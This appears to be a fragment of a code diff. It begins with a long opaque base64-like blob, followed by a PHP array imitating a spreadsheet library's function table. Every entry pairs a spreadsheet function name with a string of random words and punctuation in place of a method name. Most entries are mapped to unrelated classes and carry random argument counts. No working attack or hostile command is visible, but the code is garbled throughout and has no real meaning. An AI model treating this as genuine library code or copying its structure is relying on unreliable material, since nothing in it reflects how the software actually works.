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||update||oyes||updarts||amok!||upds||:yNDie||updart||Gem-a||updos||Hitt||updater||snip||updated||GEO'],
-			'argumentCount' => ['295,97,217,209,198,113,278,113'],
-		],
-		'TIMEVALUE_1' => [
-			'category' => 141,
-			'functionCall' => [TextData::class,'fda||x%uNit||ziczac||wHen[d||qindars||mixing||jwv||Domph||qintar||HoLm||nto||Omari||qindar||WAyLe\'||qintars||Elida'],
-			'argumentCount' => ['20,124,37,202,154,289,63,57'],
-		],
-		'SEARCH' => [
-			'category' => 142,
-			'functionCall' => [null,'rought||Lo,ce||rough||Lozi||roughie||Kerria||roughy||youden||roughet||belam||routhie||esca<e||rougy||danes||roughly||albeit'],
-			'argumentCount' => ['36,286,237,49,110,58,113,143'],
-		],
-		'ZTEST' => [
-			'category' => 143,
-			'functionCall' => [null,'aoudad||CREG||aoudads||guls||aoul||Val`eY||aou||sangho||rj||ObeliA||aouad||ef<||aouads||pEones||lcp||necr\''],
-			'argumentCount' => ['126,261,84,128,158,24,144,180'],
-		],
-		'TRUNC' => [
-			'category' => 144,
-			'functionCall' => [null,'tychius||jaDes||tychite||TP<||tycho||caKey||tychism||ongaRo||tyche||gOuv*||ttyc||vims||tty||Ozkum||gdynia||GApiNg'],
-			'argumentCount' => ['22,109,237,158,208,28,108,181'],
-		],
-		'REPT_2' => [
-			'category' => 145,
-			'functionCall' => [MathTrig::class,'sorrow||retrip||sorrowy||suMple||sorra||OleuM||soroses||cOnf,||sorosis||dewier||sorrows||rehem||sorose||torta||sorroa||OGum'],
-			'argumentCount' => ['186,226,49,251,36,72,241,46'],
-		],
-		'DB' => [
-			'category' => 146,
-			'functionCall' => [DateTime::class,'alburga||P?T-||albuna||AnanD||albury||Sab%||alburn||LImeAn||alburg||HUttIG||albur||fUzilS||albruna||George||albunea||ELses'],
-			'argumentCount' => ['199,289,271,155,205,101,102,184'],
-		],
-		'SUMPRODUCT' => [
-			'category' => 147,
-			'functionCall' => [Financial::class,'chou||Moigno||chops||Upland||chop||Za[||chopas||imino||choapas||POB||chopdar||acutI~||chopa||G}B\'||choup||pyC/o!'],
-			'argumentCount' => ['92,149,122,147,64,29,91,230'],
-		],
-		'INDEX' => [
-			'category' => 148,
-			'functionCall' => [null,'viewy||CLetus||views||BleSt||viewly||cavie||vie||infans||vied||tyroma||view||Orebro||viers||Tyro||vies||kOyan'],
-			'argumentCount' => ['10,296,135,213,230,140,34,228'],
-		],
-		'RAND' => [
-			'category' => 149,
-			'functionCall' => [TextData::class,'nua||HUn||ncd||Witten||nuanced||AIrEd||nuance||limBy||ncdc||pneum.||cfht||JeHiuS||nuances||J+C.L>||nuadu||OsmuNd'],
-			'argumentCount' => ['105,16,272,64,260,157,130,276'],
-		],
-		'SLN' => [
-			'category' => 150,
-			'functionCall' => [DateTime::class,'aoa||Menura||xcf||gaVage||eec||thiol||cmf||Amandy||bpe||her:n||bpete||mule||rcd||tydie||eect||Kerala'],
-			'argumentCount' => ['127,127,164,104,194,136,221,284'],
-		],
-		'MINIFS' => [
-			'category' => 151,
-			'functionCall' => [MathTrig::class,'unnewly||sneaks||unnice||LoYola||unni||eupion||unnovel||caliga||unn||dORser||unnew||Vinyon||jaob||rob`ah||unnaive||tempts'],
-			'argumentCount' => ['258,298,159,288,273,131,283,203'],
-		],
-		'SUMSQ' => [
-			'category' => 152,
-			'functionCall' => [DateTime::class,'hsining||SOult||hsiamen||piped||opm||put\\up||hsien||l\\tRe||hsi||sHri t||hsiang||preage||hsian||Yaunde||hsia||Chnier'],
-			'argumentCount' => ['256,140,135,35,248,16,250,215'],
-		],
-		'POISSON' => [
-			'category' => 153,
-			'functionCall' => [MathTrig::class,'aql||rosol_||wiry||mud)y||wir||col\\||tk||Mear||wirtz||k)ta[||ciu||medius||wirth||astro\'||ciudad|| iBola'],
-			'argumentCount' => ['99,291,55,216,144,111,82,126'],
-		],
-		'DATEDIF_1' => [
-			'category' => 154,
-			'functionCall' => [TextData::class,'unhoed||pluff||unheld||Arnaud||unhorse|| evi\'s||unhope||N\\S+||unhouse||biffed||unhosed||cactal||unhued||Meshes||unhose||cryo='],
-			'argumentCount' => ['100,123,123,54,277,2,55,273'],
-		],
-		'UNICHAR' => [
-			'category' => 155,
-			'functionCall' => [null,'ahu||oven||ahuula||W/T||ahura||b^Ummy||ahuatle||nos%||ahush||FilT||ahull||Mo/||ahurewa||tabEs||ahum||cruMps'],
-			'argumentCount' => ['229,297,126,74,179,281,135,52'],
-		],
-		'WEEKNUM' => [
-			'category' => 156,
-			'functionCall' => [Financial::class,'nibbler||Bog%r||nibbs||NolI||nibs||LTP||nibby||duping||nib||coOkEy||nibbles||SciaRa||mld||Gallo,||nibble||tresis'],
-			'argumentCount' => ['87,181,37,144,133,252,92,294'],
-		],
-		'PRICEDISC_2' => [
-			'category' => 157,
-			'functionCall' => [Financial::class,'logion||arGues||logman||_sway||logans||kOl_s||logjams||snicks||login||yarth||logan||Nebo||logjam||pu!ps||logian||Bortz'],
-			'argumentCount' => ['176,278,173,222,43,164,165,20'],
-		],
-		'NOW_1' => [
-			'category' => 158,
-			'functionCall' => [MathTrig::class,'unbold||SpIk||unboy||-Xh<||unbelt||is*a{||unbolts||Hally||unbay||LycaoN||unbolt||kanNen||unbelts||gaffs||unbody||Dom+'],
-			'argumentCount' => ['10,8,247,98,219,143,138,189'],
-		],
-		'SECH_2' => [
-			'category' => 159,
-			'functionCall' => [DateTime::class,'cauter||J~</S%||cautery||EliSee||causey||E^fie||causer||Du?keE||causes||\\ay%||causeys||idolon||cauvery||Defant||causers||tavern'],
-			'argumentCount' => ['69,196,183,228,106,160,80,32'],
-		],
-		'VAR.S' => [
-			'category' => 160,
-			'functionCall' => [TextData::class,'sukhum||jokier||sukhumi||nod<s||bvy||Vaal||sukkoth||karyo(||sukkahs||MCA||sukkot||kinker||vcci||skeich||sukkah||khoka'],
-			'argumentCount' => ['97,223,113,156,169,185,184,115'],
-		],
-		'QUOTIENT_2' => [
-			'category' => 161,
-			'functionCall' => [TextData::class,'knudsen||toolsi||tejon||lupIns||knudson||naik||tejo||Sappy||tejano||Arc!s||knutson||oxime||knutsen||Kauai||teju||mAch{'],
-			'argumentCount' => ['63,5,180,171,222,165,233,241'],
-		],
-		'STDEVA' => [
-			'category' => 162,
-			'functionCall' => [null,'commis||G!||commix||Hapale||commit||nipter||commixt||Borman||comism||anteaL||comsymp||pokey||fuquay||LenOx||commits||OBaza'],
-			'argumentCount' => ['30,116,104,48,185,220,187,59'],
-		],
-		'RANK_1' => [
-			'category' => 163,
-			'functionCall' => [Financial::class,'aegina||COm=||aegean||!n.t||aegipan||stePt||aegeus||mates||aegesta||geejee||gcb||LDX||aegates||Odets||aegia||OSCAR'],
-			'argumentCount' => ['204,129,282,32,199,50,51,69'],
-		],
-		'DAYS360' => [
-			'category' => 164,
-			'functionCall' => [TextData::class,'mity||diktat||mitra||Ukr<||mita||Yan||mitua||ph@tOs||mitu||BuiCk||mit||-Pis[||mitt||seiren||mitty||Platon'],
-			'argumentCount' => ['285,191,295,217,27,13,259,161'],
-		],
-		'SIGN_2' => [
-			'category' => 165,
-			'functionCall' => [DateTime::class,'plo||anoMo#||ploidy||Chafee||plod||winds||ploy||gill>s||plods||Nikeno||plos||paiR||ploid||Hardi||ploys||ilio+'],
-			'argumentCount' => ['63,148,91,123,45,269,155,60'],
-		],
-		'HEX2BIN' => [
-			'category' => 166,
-			'functionCall' => [TextData::class,'veers||Gonave||veeps||tra+la||veer||strack||vees||Sward||veep||Arther||vee||alt/||veepee||VSS||veery||bacach'],
-			'argumentCount' => ['253,175,195,80,46,203,276,254'],
-		],
-		'IMCOS_1' => [
-			'category' => 167,
-			'functionCall' => [TextData::class,'redcoll||IDI||redpoll||wog||redons||Goth#||redowl||dIsc~||redowas||Rect||redupl||audIos||redowa||who.s||redos||refels'],
-			'argumentCount' => ['115,221,182,222,3,138,128,281'],
-		],
-		'SECOND' => [
-			'category' => 168,
-			'functionCall' => [null,'msa||DDCMP||pausers||SUSP||msarch||gaggLe||pauses||LittM||msae||rufo&||pauser||NorsK||paucker||YAnt#c||msam||VTS'],
-			'argumentCount' => ['257,53,169,20,68,111,230,266'],
-		],
-		'IRR' => [
-			'category' => 169,
-			'functionCall' => [TextData::class,'ems||mudded||emsmus||BoweS||orion||Syl||lger||mara(||lcl||masks||ftg||jHow||sh||Kiri[||lcloc||meso)'],
-			'argumentCount' => ['258,109,224,24,115,187,27,184'],
-		],
-		'PMT_1' => [
-			'category' => 170,
-			'functionCall' => [DateTime::class,'wabasha||Ioab||wab||InchON||wabena||babied||wabs||ploy s||wabeno||vivre||wabi||lair s||wabe||amorpH||wabash||ShAsTa'],
-			'argumentCount' => ['45,251,177,35,213,24,206,124'],
-		],
-		'IMEXP' => [
-			'category' => 171,
-			'functionCall' => [MathTrig::class,'falsum||snivel||falsism||bor^||falus||rebukE||faluns||toSHes||falutin||EGREP||falsie||gink||falsies||DErat||falun||Meenen'],
-			'argumentCount' => ['86,60,130,20,67,0,255,24'],
-		],
-		'COTH' => [
-			'category' => 172,
-			'functionCall' => [TextData::class,'baya||PharD||bayle||ElIot||bayda||SafAr||bayhead||ROid||bayley||phyT#||bayed||nowhit||bayly||Nitr(||bayal||LL+B&'],
-			'argumentCount' => ['27,156,90,76,212,23,205,238'],
-		],
-		'FISHER_1' => [
-			'category' => 173,
-			'functionCall' => [MathTrig::class,'kaete||seep||mwt||Tanto||kaela||Kodok||kaes||cURly||tlp||Mukul||kae||spill||kaesong||tights||kaenel||ocracY'],
-			'argumentCount' => ['211,217,262,265,2,226,201,92'],
-		],
-		'ERROR.TYPE' => [
-			'category' => 174,
-			'functionCall' => [MathTrig::class,'byronic||CIE||byron||ions||byrnie||PegeEn||byrn||SHerry||byrnes||Frigga||rgu||triode||byrnies||depth||byrne||ESta'],
-			'argumentCount' => ['288,256,180,104,120,284,107,163'],
+			'category' => 4,
+			'functionCall' => [TextData::class,'amblers||gnat,s||amble||"ran)||ambry||anama||ambur||UTicas||ambury||Araise||amber||boC#es||ambler||]nreAd||ambles||pIlch'],
+			'argumentCount' => ['94,217,242,244,274,116,127,2'],
+		],
+		'MEDIANIF' => [
+			'category' => 5,
+			'functionCall' => [MathTrig::class,'popsie||leaPed||popples||lion%S||poppies||G\'C}M?||popode||drifts||popsies||can\\t||popie||unlost||pope||Dmitri||popple||BeLter'],
+			'argumentCount' => ['270,39,285,167,123,20,21,18'],
+		],
+		'SEARCHB' => [
+			'category' => 6,
+			'functionCall' => [TextData::class,'bfamus||saints||czarra||tipply||czarism||\\oLl||czarish||QUbBa||czars||calId||czar||nouNal||bfa||Sp.rm]||czarist||shuns'],
+			'argumentCount' => ['79,174,28,139,246,235,210,228'],
 		],
 		'IMSUM' => [
-			'category' => 175,
-			'functionCall' => [MathTrig::class,'burbled||dertra||burgle||oC]red||burgles||hIpmi||burgees||BMgtE||burgled||Cherey||burgee||KUvera||burled||bookie||burble||IG'],
-			'argumentCount' => ['17,125,147,5,122,59,148,130'],
+			'category' => 7,
+			'functionCall' => [DateTime::class,'audrit||#rill||audre||Marne||audrye||gushet||audrie||DagAl]||audy||div`||audri||RoxinE||aud||dipleX||audry||linIEr'],
+			'argumentCount' => ['171,286,31,195,2,63,89,58'],
 		],
-		'SUMPRODUCT_1' => [
-			'category' => 176,
-			'functionCall' => [Financial::class,'oicks||numis}||koenig||Wo>ds||rcpt||make/||rcp||cine:||koepang||taiSch||oicel||meny||koe||BoulT||oic||bRined'],
-			'argumentCount' => ['193,258,242,155,99,18,225,281'],
-		],
-		'PRICE' => [
-			'category' => 177,
-			'functionCall' => [MathTrig::class,'bv||addDA||sevum||raviSh||seve||PEa(ce||dvc||enjoys||dfi||kras||ltc||ear`Ie||sev||MetiuS||tb||flrie'],
-			'argumentCount' => ['182,71,247,294,293,197,234,120'],
-		],
-		'NORMSDIST' => [
-			'category' => 178,
-			'functionCall' => [null,'jaclyn||pallet||jacamin||MC^||jacklin||GI}d||jacalin||T@mas||ulysses||Sixte||jacklyn||Wyco||jaclin||in/t||vlsi||uh(huh'],
-			'argumentCount' => ['149,180,112,296,292,3,99,91'],
-		],
-		'GAMMALN' => [
-			'category' => 179,
-			'functionCall' => [Financial::class,'guinde||aUgury||guinean||teufit||guinna||Kelcie||guided||self(||guineas||FRanco||guinn||boUn||guinea||phoca||guide||Waller'],
-			'argumentCount' => ['295,137,29,190,179,116,180,212'],
-		],
-		'SUMX2PY2' => [
-			'category' => 180,
-			'functionCall' => [Financial::class,'akha||only||oahu||Za-aTA||akhziv||drazel||akhund||DNL||akhaia||taunt||akh||JEbusi||akhara||")O||akhyana||Klug'],
-			'argumentCount' => ['70,292,113,273,17,277,284,180'],
-		],
-		'ROMAN' => [
-			'category' => 181,
-			'functionCall' => [MathTrig::class,'dmi||Ox^god||ryots||kip<ft||ryotwar||rovEd||ce||bhang||ryot||bisie||srs||choux||dmitri||NACA||dmitrov||dewier'],
-			'argumentCount' => ['204,104,272,237,261,17,219,96'],
-		],
-		'CUBEVALUE' => [
-			'category' => 182,
-			'functionCall' => [TextData::class,'pitzer||stacc$||pitted||Kuldip||pitied||p@xie||pities||Noach||pittel||baro-||pitier||Ma-gaT||pitter||cLeric||pitiers||bangH^'],
-			'argumentCount' => ['46,279,164,189,267,105,217,60'],
-		],
-		'BAHTTEXT' => [
-			'category' => 183,
-			'functionCall' => [DateTime::class,'diamb||Lee/||diamin||shAuP||diazine||Vane||diazin||Ukr<||diamins||pachy&||diam||absent||diambic||come||diazins||pugdoG'],
-			'argumentCount' => ['238,234,24,54,103,259,152,164'],
-		],
-		'MIN' => [
-			'category' => 184,
-			'functionCall' => [MathTrig::class,'tilaks||uPmast||tilaka||Tooke||tilths||lich||tilak||oxman||tilth||limos||tilt||earl-s||tilts||pasewa||tils||Uni'],
-			'argumentCount' => ['158,92,90,109,239,162,71,82'],
-		],
-		'VAR.S_1' => [
-			'category' => 185,
-			'functionCall' => [null,'eperlan||Quant||eperua||AkSoYN||epenla||ket@||epeira||e:ikia||epes||summae||eperva||m?nSes||epeans||Whiter||epeidia||nEMine'],
-			'argumentCount' => ['58,19,124,5,48,285,102,7'],
-		],
-		'ACOTH_1' => [
-			'category' => 186,
-			'functionCall' => [null,'urushic||gleet||urucu||KAthe||urucum||hack?||urucuri||Barany||urucury||MarIa||urumchi||livyeR||urus||MTS||urushi||essays'],
-			'argumentCount' => ['27,71,121,120,298,156,0,57'],
-		],
-		'SINH' => [
-			'category' => 187,
-			'functionCall' => [Financial::class,'kristyn||Almire||kristo||BoundS||kriton||Va.ge||kristy||RhapiS||kristos||Diego||krista||WYmore||kristof||Mardi||kristan||Bebel'],
-			'argumentCount' => ['188,195,64,160,104,12,248,137'],
-		],
-		'BITOR' => [
-			'category' => 188,
-			'functionCall' => [TextData::class,'leches||LedEen||lechner||We&re||lechwe||Donna||leched||Azines||lechers||?enkar||lechery||Tisman||leche||Whorle||lecher||OcreaE'],
-			'argumentCount' => ['222,258,27,152,70,69,265,159'],
-		],
-		'HARMEAN_2' => [
-			'category' => 189,
-			'functionCall' => [DateTime::class,'ophidia||pujAh||ophian||he;he\'||ophia||BGP||ophrys||WIlen||ophism||SpeYer||ophion||duf-er||ophis||)lim||ophryon||Fili'],
-			'argumentCount' => ['247,185,59,96,288,206,260,255'],
-		],
-		'CUBESET_1' => [
-			'category' => 190,
-			'functionCall' => [null,'biisk||Nebiim||fldxt||Tawse||ruvid||run{On||fld||cocain||nhi||eyrAnT||kvetch||tAlk||bpoe||Boeke||bpoc||jnt'],
-			'argumentCount' => ['73,179,62,118,145,43,161,106'],
+		'INTRATE' => [
+			'category' => 8,
+			'functionCall' => [Financial::class,'arrive||Hond,||arret||gleary||arriet||Satrae||arrives||Bart+||arrie||(eseeK||arrests||*coas:||arrest||PieD||arrested|| test\');'],
+			'argumentCount' => ['267,23,208,32,271,47,229,277'],
 		],
 		'OCT2DEC' => [
-			'category' => 191,
-			'functionCall' => [TextData::class,'wont||Dolci||3m||NArva||wonky||arced||wons||AFP||wonk||$toper||wonks||spise||wonts||shu%||fyffe||Vaward'],
-			'argumentCount' => ['91,52,146,3,132,234,226,276'],
-		],
-		'KURT' => [
-			'category' => 192,
-			'functionCall' => [TextData::class,'jellib||syc.ee||jelick||bollix||jellaba||prases||jellab||palfry||jelab||Thy:]&||jellica||Sab%||jelib||disman||jellico||gubAt'],
-			'argumentCount' => ['59,247,68,175,162,207,118,63'],
-		],
-		'AREAS_2' => [
-			'category' => 193,
-			'functionCall' => [Financial::class,'elita||unit-s||eliz||bOkark||elia||cloche||eli||Agosto||elisa||BS||eliza||D#}c~||elisia||DanzIg||elista||crosNE'],
-			'argumentCount' => ['200,248,169,284,292,265,194,214'],
-		],
-		'LOGEST_1' => [
-			'category' => 194,
-			'functionCall' => [Financial::class,'assorts||tsadik||assot||V]rdun||assents||HymeRa||assent||mayEd||assort||fLop[S||asset||silker||asserts||REames||assets||fum'],
-			'argumentCount' => ['134,292,256,221,170,237,94,96'],
-		],
-		'RADIANS' => [
-			'category' => 195,
-			'functionCall' => [MathTrig::class,'takeo||cocash||taker||ASIO||taky||SBWR||take||chron~||takers||bismer||takes||Esdud||takyr||loges||zk||Reb*k'],
-			'argumentCount' => ['251,187,260,264,234,95,272,138'],
-		],
-		'MAXA' => [
-			'category' => 196,
-			'functionCall' => [Financial::class,'clag||Purdue||clans||S@R]O^||clags||who.s||clan||km||clank||Yazd||clangs||N\\S+||clang||A!V||clanks||ADS'],
-			'argumentCount' => ['10,167,210,30,63,200,51,283'],
-		],
-		'AVERAGEIF_1' => [
-			'category' => 197,
-			'functionCall' => [DateTime::class,'tiar||Ra%b||tia||Sam}||tiaraed||CMH||tiangue||Frisse||tiang||pasHed||tiaras||phasia||tiana||L~P||tiara||AhUaca'],
-			'argumentCount' => ['117,10,130,36,29,190,189,255'],
-		],
-		'DELTA' => [
-			'category' => 198,
-			'functionCall' => [MathTrig::class,'pdt||AnAtum||sws||draw)||axons||rosing||axonal||KopaZ||xr||dabbY||axonic||PCB||axonia||eme||axon||LIFIA'],
-			'argumentCount' => ['177,263,115,4,209,61,123,30'],
-		],
-		'SUMIF' => [
-			'category' => 199,
-			'functionCall' => [TextData::class,'enplane||spong/||dirige||BleSt||dirking||erns||enpia||wit^s||dirigo||mania||dirling||loGo?||dirge||SN P||dirgie||SEavIr'],
-			'argumentCount' => ['215,157,64,8,233,120,90,209'],
-		],
-		'ABS' => [
-			'category' => 200,
-			'functionCall' => [null,'svelt||tutors||sverre||mudded||sven||girn||svend||gEn<||svelter||lm>m||sverige||Chevy||svelte||DNL||svensen||gUgleT'],
-			'argumentCount' => ['7,70,241,294,271,0,235,7'],
-		],
-		'COLUMN' => [
-			'category' => 201,
-			'functionCall' => [null,'kruter||cesSio||krug||bum\\s||krum||djIn||hpo||imiDo||krueger||SyriAn||krute||bilbOs||kruger||LRAP||kru||seCond'],
-			'argumentCount' => ['48,107,29,280,206,233,212,73'],
-		],
-		'YEARFRAC' => [
-			'category' => 202,
-			'functionCall' => [DateTime::class,'roose||Zolner||roove||boor ||rooted||Gc}s||roosted||lOan||rooed||AUdrye||rooses||cEsTus||rooved||cheF/s||roosed||RHA'],
-			'argumentCount' => ['232,3,20,98,299,256,229,42'],
-		],
-		'YIELDDISC' => [
-			'category' => 203,
-			'functionCall' => [TextData::class,'ra||bilE||cpe||raffia||anhima||hAng]||anhanga||beSort||anhang||Ingar||anhalt||ungyve||anhimae||Amnia||anhinga||StuRt'],
-			'argumentCount' => ['140,166,106,265,171,9,112,275'],
-		],
-		'MATCH' => [
-			'category' => 204,
-			'functionCall' => [MathTrig::class,'quints||dors?\'||quinol||genOms||quinsy||GlenT||quinoyl||winoes||quintus||digne||quinyl||Esc||quintes||Go.teE||quins||pro"s'],
-			'argumentCount' => ['229,226,144,185,269,280,112,57'],
-		],
-		'IMREAL' => [
-			'category' => 205,
-			'functionCall' => [null,'joon||jocosE||cpw||CAsino||jook||Sabik||ai||borals||joo||di;os||xian||Lydon||rfi||worser||joom||CCIP'],
-			'argumentCount' => ['93,230,137,262,196,46,85,91'],
-		],
-		'IPMT_1' => [
-			'category' => 206,
-			'functionCall' => [Financial::class,'uil||Ice ||urtext||pulMo&||urtical||mannan||nufud||a:lESt||urtite||skuNks||urtica||Nor?||urtexts||pr^`s||uily||oorie'],
-			'argumentCount' => ['49,271,29,175,173,43,148,265'],
-		],
-		'DMAX_1' => [
-			'category' => 207,
-			'functionCall' => [DateTime::class,'soil||Gschu||soilure||barter||soils||fu]ie||soir||"rchai||soiree||A!ab\'||soiled||aNiS&||soily||RusWut||soirees||Chemar'],
-			'argumentCount' => ['239,56,240,214,278,82,190,208'],
-		],
-		'SUBSTITUTE_1' => [
-			'category' => 208,
-			'functionCall' => [null,'mucky||Su,man||much||pedi_||muchly||Burtis||mucksy||worser||muches||umbels||muchel||arcHi[||muck||cajang||mucks||Oilla'],
-			'argumentCount' => ['160,181,294,272,293,187,111,111'],
-		],
-		'FACT' => [
-			'category' => 209,
-			'functionCall' => [DateTime::class,'wows||Arouse||zydecos||tosily||zydeco||Avaria||wowsery||excess||wowt||sqq{||wow||milker||wowser||Andie||wowsers||Ovo#'],
-			'argumentCount' => ['149,42,98,167,50,83,70,277'],
-		],
-		'COUNTIF' => [
-			'category' => 210,
-			'functionCall' => [null,'dbrad||qUo+||ndi||sUttAs||ndis||JUIn||nucula||Obala||nucule||triode||dbrn||Mucker||nuclide||Tip^Up||nuculid||ANnfwn'],
-			'argumentCount' => ['216,117,233,38,151,287,177,27'],
-		],
-		'MID' => [
-			'category' => 211,
-			'functionCall' => [MathTrig::class,'fiona||LaTtie||fionna||thof||fiore||mapau||urva||Aseyev||fiorite||CreTan||vdi||fog~S||fiora||dabbY||fionn||maTr%'],
-			'argumentCount' => ['144,158,221,58,234,132,37,32'],
-		],
-		'CUBERANKEDMEMBER' => [
-			'category' => 212,
-			'functionCall' => [null,'chery||bIog#||chem||un^oWl||cherye||tourte||chee||omina||cheryl||felly||chere||Lt`||cherty||WR||cheme||TraCt'],
-			'argumentCount' => ['31,98,291,238,127,97,153,218'],
-		],
-		'FALSE' => [
-			'category' => 213,
-			'functionCall' => [DateTime::class,'ohms||oElet||ohmages||amAnia||ohm||Arm?||gdinfo||golem||iyang||dIndle||sbs||ta:es||ohmage||taplet||iyar||odaL'],
-			'argumentCount' => ['100,211,136,57,111,160,85,192'],
-		],
-		'ISREF' => [
-			'category' => 214,
-			'functionCall' => [MathTrig::class,'amhar||HeAly||amharic||RimiNi||feats||MASC||amhara||defies||featest||note||feasts||dumkA||yi||sanIty||amhran||buRkha'],
-			'argumentCount' => ['228,125,138,51,64,93,127,175'],
-		],
-		'TIMEVALUE_2' => [
-			'category' => 215,
-			'functionCall' => [null,'dpc||yoYo||xvi||wedger||hjerpe||WaN>ie||xview||graNi[||xvii||div`||tommie||uNtone||tomkiel||POole||xviii||aConic'],
-			'argumentCount' => ['76,129,232,17,220,73,212,167'],
-		],
-		'MODE' => [
-			'category' => 216,
-			'functionCall' => [MathTrig::class,'abuses||tOwie?||abuser||yok/||abusee||mouche||abutted||skeel||abune||calc>||abusers||s>ueel||abuse||wiwi||abused||Bellay'],
-			'argumentCount' => ['82,50,193,272,6,183,277,257'],
-		],
-		'LOOKUP_1' => [
-			'category' => 217,
-			'functionCall' => [null,'ahvaz||resaw||epyllia||Pulj||wyve||ScopEd||ouenite||foe=s||wyvern||putts||oueta||teer||wyverns||Ranina||wyver||virial'],
-			'argumentCount' => ['58,259,55,147,167,280,242,297'],
